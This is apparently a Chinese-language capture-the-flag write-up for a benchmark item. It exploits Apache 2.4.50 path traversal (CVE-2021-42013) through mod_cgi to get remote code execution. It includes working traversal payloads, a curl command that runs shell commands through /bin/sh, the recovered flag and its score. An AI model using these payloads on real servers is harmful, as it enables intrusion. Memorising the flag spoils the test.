# xben-026-24 · 探索记录

对应题解：[`xben-026-24.md`](./xben-026-24.md)

## 目标与起点

容器 `10.0.173.136:80`，响应头：

```text
Server: Apache/2.4.50 (Unix)
Last-Modified: Mon, 08 Jun 2026 06:57:12 GMT
ETag: "132f-653b885138200"
```

首页是纯静态作品集（`index.html`、`styles.css`、`scripts.js`、`dev1.jpeg`、`dev2.jpeg`），
联系表单只有前端 JS，没有后端。

**版本号 2.4.50 是第一线索**：CVE-2021-41773（2.4.49）与 CVE-2021-42013（2.4.50）都是
`mod_cgi` + 路径穿越 → RCE。

## 第一阶段：`.%2e` 直接穿越

| 路径 | 结果 |
| --- | --- |
| `/.%2e/.%2e/.%2e/.%2e/etc/passwd` | **400** |
| `/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` | 400 |
| `/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd` | 400 |
| `/..%2f..%2f..%2f/etc/passwd` | 404 |

400 说明请求在解析阶段被拒——补丁在起作用。

## 第二阶段：确认 `.%2e` 仍被解析

| 路径 | 结果 |
| --- | --- |
| `/%2e/index.html` | 200 |
| `/.%2e/index.html` | 400 |
| `/cgi-bin/.%2e/index.html` | **200**（返回站点首页） |
| `/cgi-bin/test` | 404 |

`/cgi-bin/.%2e/index.html` 能返回首页，说明 `.%2e` 被解析、且能在**文档根内部**上跳一层。
根外跳（`..%2f..%2f..%2f..`）则是 400。

同时确认 `/cgi-bin/` 存在（目录 403），`/.htaccess`、`/.htpasswd` 也是 403。

## 第三阶段：`%%32%65` 二次编码绕过（CVE-2021-42013 的补丁绕过）

| 路径 | 结果 |
| --- | --- |
| `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd` | 403 |
| `/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd` | **500** |
| `/cgi-bin/.%%32%65/.%%32%65/.%%32%65/bin/sh` | 404 |

500 是转折点：它不再是"路径被拒"，而是"进到处理阶段后出错"，
说明 `%%32%65` 让路径成功穿透到文档根之外，并落到了 CGI 处理。

## 第四阶段：POST 命令给 `/bin/sh`

```bash
curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'echo Content-Type: text/plain; echo; id' \
  'http://$T/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
```

```text
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

`mod_cgi` 把 POST body 当 stdin 交给 `/bin/sh`，命令回显正常。

## 第五阶段：找 flag

```bash
rce 'ls -la /'
```

```text
-rw-r--r--   1 root root   42 Oct 27 03:05 FLAG.txt
...
```

**注意文件名是大写 `FLAG.txt`**，`cat /flag` 是空的。

```bash
rce 'cat /FLAG.txt'
# flag{67500c26-2de9-4a55-a049-643b8b0c71c4}
```

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `/.%2e/.%2e/…/etc/passwd`（一手编码，根外） | 400 | 请求解析阶段被拒 |
| `/..%2f..%2f..%2f…` | 404 | 不认这种写法 |
| `/cgi-bin/.%2e/.%2e/…`（两层以上） | 400 | 离开文档根 |
| 文档根内隐藏文件（`flag`、`secret`、`.env`、`backup.zip` 等 20 个 × 2 处） | 全 404/403 | 根目录确实只有静态资源 |
| `cat /flag` / `cat /flag.txt` | 空 | 实际文件名是 `/FLAG.txt` |

## 这次真正的收获

1. **版本号即线索。** `Apache/2.4.50` 直接对应 CVE-2021-41773/42013（路径穿越 + `mod_cgi` RCE）。
   见到可疑的中间件版本，先去查它周边的 CVE，比盲试 payload 快得多。
2. **400 / 403 / 500 要分开读。**
   - 400 = 解析阶段被拒（补丁生效）
   - 403 = 可达但被访问控制拒
   - **500 = 已经进到处理阶段**
   本题的 `%%32%65` 变体返回 500 而不是 400，正是"穿越成功、但目标不可执行"的信号，
   由此转向"把目标换成 `/bin/sh`"。
3. **先在文档根内验证编码是否被解析。** `/cgi-bin/.%2e/index.html` → 200，
   证明 `.%2e` 有效；再判断"根外被拒"是策略限制而不是编码问题。
4. **`mod_cgi` 把文件读升级为 RCE。** 判据是 POST body 能作为 stdin 被 `/bin/sh` 执行
   （`id` 回显 `uid=1(daemon)`）。
5. **拿 shell 后先 `ls /`。** 本题 flag 是 `/FLAG.txt`（大写），
   如果一直按惯例试 `/flag`、`/flag.txt` 就会误判成"没有文件"。
